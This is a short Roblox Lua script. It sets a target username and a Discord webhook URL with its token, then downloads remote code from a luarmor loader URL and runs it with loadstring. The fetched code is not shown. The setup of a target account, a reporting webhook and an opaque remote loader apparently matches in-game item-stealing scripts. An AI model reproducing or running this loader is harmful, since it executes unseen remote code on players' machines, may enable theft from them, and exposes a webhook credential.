-- Mode: NORMAL
getgenv().TARGET_USERNAME = "Cruzgangontop1235"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1537022338049253418/4AkBBN80Zh3bIEWnlQ_obWHa7EWvklU5l55iZHeWwt-wI5yIcp52yagqm0Quvej7Je3h"
...
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()
end)